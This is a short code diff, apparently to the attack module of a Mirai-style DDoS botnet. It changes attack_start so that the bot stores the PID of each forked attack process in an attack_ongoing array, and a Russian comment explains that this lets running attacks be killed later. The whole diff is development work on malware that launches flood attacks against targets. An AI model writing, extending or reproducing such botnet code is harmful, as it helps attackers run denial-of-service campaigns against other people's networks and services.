@@ -146,10 +146,25 @@ void attack_parse(char *buf, int len)
 void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
     int pid1, pid2;
+    int i;
 
     pid1 = fork();
-    if (pid1 == -1 || pid1 > 0)
+    if (pid1 == -1)
         return;
+    
+    if (pid1 > 0)
+    {
+        // сохраняем pid атаки для возможности убить позже
+        for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
+        {
+            if (attack_ongoing[i] == 0)
+            {
+                attack_ongoing[i] = pid1;
+                break;
+            }
+        }
+        return;
+    }
 
     pid2 = fork();
     if (pid2 == -1)
@@ -162,8 +177,6 @@ void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct 
     }
     else
     {
-        int i;
-
         for (i = 0; i < methods_len; i++)
         {
             if (methods[i]->vector == vector)
